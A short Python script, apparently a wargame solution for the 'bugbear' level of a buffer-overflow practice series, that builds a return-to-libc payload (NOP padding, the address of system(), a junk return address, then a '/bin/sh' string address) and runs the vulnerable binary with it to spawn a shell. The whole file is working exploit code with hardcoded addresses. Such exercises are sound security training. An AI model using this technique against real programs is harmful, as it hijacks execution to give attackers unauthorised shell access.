import struct
import os

payload = ""

def append(x):
    return payload + x

def p(x):
    return struct.pack("<L", x)

systemAddr = 0x40058ae0
shellAddr = 0x400fbff9

payload = append("\x90"*44)
payload = append(p(systemAddr))
payload = append("A"*4)
payload = append(p(shellAddr))

pid = os.fork()
target = '/home/darkknight/bugbear'
#자식 프로세스라면
if pid == 0:
    os.execv(target, (target, payload))
else:
    os.waitpid(pid, 0)